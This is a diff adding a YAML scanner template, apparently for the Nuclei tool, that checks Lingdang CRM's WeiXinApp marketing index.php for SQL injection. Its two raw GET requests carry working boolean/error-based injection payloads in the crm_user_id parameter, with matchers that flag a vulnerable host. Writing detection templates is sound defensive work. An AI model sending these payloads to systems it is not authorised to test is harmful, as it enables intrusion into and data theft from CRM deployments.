@@ -1,0 +1,44 @@
+id: poc-yaml-51mis-crm-marketing-index-sqli
+info:
+  name: Lingdang CRM SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    The Lingdang CRM system's index.php is vulnerable to SQL Injection. This template checks for SQL injection vulnerabilities in the specified parameter.
+http:
+  - raw:
+      - |
+        GET /crm/WeiXinApp/marketing/index.php?module=WxOrder&action=getOrderList&crm_user_id=1%20and%20if((select%20length((select%20123))=3),1,2*1e308)--+ HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "\"appname\""
+          - "\"search_reminds\""
+          - "\"totalamounts\""
+        part: body
+      - type: regex
+        regex:
+          - "<"
+        negative: true
+        part: body
+      - type: status
+        status:
+          - 200
+  - raw:
+      - |
+        GET /crm/WeiXinApp/marketing/index.php?module=WxOrder&action=getOrderList&crm_user_id=1%20and%20if((select%20length((select%20123))=1),1,2*1e308)--+ HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "Fatal error"
+          - "Uncaught Exception"
+          - "Stack trace"
+        part: body
+      - type: status
+        status:
+          - 200
